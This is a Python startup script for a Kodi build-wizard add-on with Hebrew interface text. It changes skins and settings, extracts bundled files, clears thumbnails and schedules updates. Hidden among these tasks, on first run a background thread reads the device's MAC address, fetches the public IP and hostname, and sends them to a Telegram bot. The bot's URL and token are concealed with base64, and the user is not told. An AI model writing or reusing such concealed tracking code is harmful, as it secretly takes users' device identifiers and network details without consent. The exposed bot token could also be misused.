# coding: utf-8

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs,re,uservar,time,json,platform
from resources.libs import wizard as wiz


translatepath=xbmcvfs.translatePath
global teleupdate
teleupdate=False
ADDON_ID       = uservar.ADDON_ID
ADDONTITLE     = uservar.ADDONTITLE
ADDON          = wiz.addonId(ADDON_ID)
VERSION        = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH      = wiz.addonInfo(ADDON_ID,'path')
ADDONID        = wiz.addonInfo(ADDON_ID,'id')
DIALOG         = xbmcgui.Dialog()
DP             = xbmcgui.DialogProgress()
HOME           = translatepath('special://home/')
ADDONS         = os.path.join(HOME,     'addons')
USERDATA       = os.path.join(HOME,     'userdata')
ADDONDATA      = os.path.join(USERDATA, 'addon_data', ADDON_ID)
SKIN           = xbmc.getSkinDir()
BUILDNAME      = wiz.getS('buildname')
COLOR1         = uservar.COLOR1
COLOR2         = uservar.COLOR2
TMDB_NEW_API     = uservar.TMDB_NEW_API

thumbnails    =  translatepath('special://home/userdata/Thumbnails')
setting = xbmcaddon.Addon().getSetting
filesize_thumb = int(setting('filesizethumb_alert'))
total_size2 = 0

def getHwAddr_old (ifname ):

   if xbmc .getCondVisibility ('system.platform.android'):
        import subprocess
        Installed_APK =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()
        mac =re .compile ('link/ether (.+?) brd').findall (str (Installed_APK ))
        if not mac==[]:
          n =0 
          for match in mac :
            if mac !='00:00:00:00:00:00':
              mac_address =match
              n =n +int (mac_address .replace (':',''),16 )
              break
        else:
            n=xbmc.getInfoLabel('System.FriendlyName')
            regex='[0-9]+'
            text2=re.compile(regex).findall(n)
            pin=text2[0]
            return pin
   elif xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
                break

   else :
       n =0 
       from uuid import getnode as get_mac
       n =get_mac()

   try:
    return n
   except: pass
def getHwAddr (ifname ):

   if xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
                break


   try:
    return n
   except: pass
def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        try:
          dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        except:
          dec_c = chr((256 + (enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):
    value=decode("7643",url)
    return int(value)
def disply_hwr():
   try:
        my_tmdb=tmdb_list(TMDB_NEW_API)
        num=str((getHwAddr('eth0'))*my_tmdb)
        new_num=(num[1]+num[2]+num[5]+num[7])
        input= (ADDON.getSetting("action"))
        ADDON.setSetting('action', str(new_num))
        
        if ADDON.getSetting('first_run')=='':   
            xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')
            try:
                tryinstall(new_num)
            except: pass
            ADDON.setSetting('first_run', 'false')
   except: 
        if ADDON.getSetting('first_run')=='': 
          xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')
          try:
            tryinstall('no_code')
          except: pass
          ADDON.setSetting('first_run', 'false')
def tryinstall(new_num):

          import json,base64,requests,urllib
          que=urllib.parse.quote_plus
          url_encode=urllib.parse.urlencode

          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          my_system = platform.uname()
          xs=my_system[1]
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
          local_ip=requests.get('https://checkip.amazonaws.com').text.strip()

          x=requests.get(error_ad+que('התקנה חדשה - ')+que(' קוד מכשיר: ')+str(new_num)+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+wiz.platform_d()+que(' שם המערכת: ')+xs+que(' גירסת ויזארד: ')+VERSION).json()
          x=requests.get(error_ad+str(new_num)).json()

def setNew(new, value):
	try:
		new = '"%s"' % new
		value = '"%s"' % value
		query = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}' % (new, value)

		response = xbmc.executeJSONRPC(query)
	except:
		pass
	return None  
def backtokodi():
    import shutil
    KODIV            = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
    from shutil import copyfile
    choice = DIALOG.yesno(ADDONTITLE, "נראה שהייתה תקלה , האם לחזור לבילד", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
    from resources.default import fix_gui,resetkodi
    if choice == 1:
        if  KODIV <= 19.5:# קודי 19
            src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/guisettings"),"19","guisettings.xml")
            dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
            copyfile(src,dst)
            xbmc.sleep(200)
            
            fix_gui()
            
            
        if  KODIV >= 20: # קודי 20
            src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/guisettings"),"20","guisettings.xml")
            dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
            copyfile(src,dst)
            xbmc.sleep(200)
            
            fix_gui()
        resetkodi()
            
if SKIN in ['skin.confluence', 'skin.estuary', 'skin.estouchy'] and not BUILDNAME == "":
         
      backtokodi()
from threading import Thread
t2 = Thread(target=disply_hwr)
t2.start()
# disply_hwr()
if BUILDNAME == "" and not os.path.exists(translatepath("special://home/addons/") + 'skin.Premium.mod'):
    wiz.wizardUpdateDP('startup')

try:
    if not os.path.exists(translatepath("special://home/addons/") + 'skin.estuary'):
            from resources.libs import extract
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
            setting_file=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skin","packages1.zip")
            src=os.path.join(translatepath("special://home/"),"addons/skin.estuary")
            extract.all(setting_file,src)
            xbmc.executebuiltin('UpdateLocalAddons()')
            # xbmc.sleep(100)
            # xbmc.sleep(100)
            xbmc.executebuiltin( "ActivateWindow(home)" )
            f_play=(os.path.join(ADDONPATH, 'resources', 'netflix.mp4'))
            xbmc.Player().play(f_play,windowed=False)
            xbmc.executebuiltin("ReloadSkin()")
except:pass

if os.path.exists(translatepath("special://home/addons/") + 'skin.Premium.mod'):

    refreshCommand = 'RunPlugin(plugin://plugin.program.Anonymous/?mode=update_tele)'
    xbmc.executebuiltin(refreshCommand)
    # xbmc.executebuiltin('AlarmClock(wizard1,{0},00:00:15,silent)'.format(refreshCommand))
    
    xbmc.executebuiltin('AlarmClock(wizard2,{0},02:00:00,silent,loop)'.format(refreshCommand))

for dirpath2, dirnames2, filenames2 in os.walk(thumbnails):
	for f2 in filenames2:
		fp2 = os.path.join(dirpath2, f2)
		total_size2 += os.path.getsize(fp2)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)

if int(total_sizetext2) > filesize_thumb:
		from resources.libs import maintenance
		maintenance.deleteThumbnails()

if BUILDNAME == " Kodi Premium":
    # if len(ADDON.getSetting("sync_user"))>0:
        # if ADDON.getSetting("startup_sync")=='false':
            # if os.path.exists(os.path.join(ADDONS, 'plugin.video.telemedia')):
                # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=207&url=www)")

            # ADDON.setSetting("startup_sync",'true')
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]System Is Started[/COLOR]' % COLOR2)
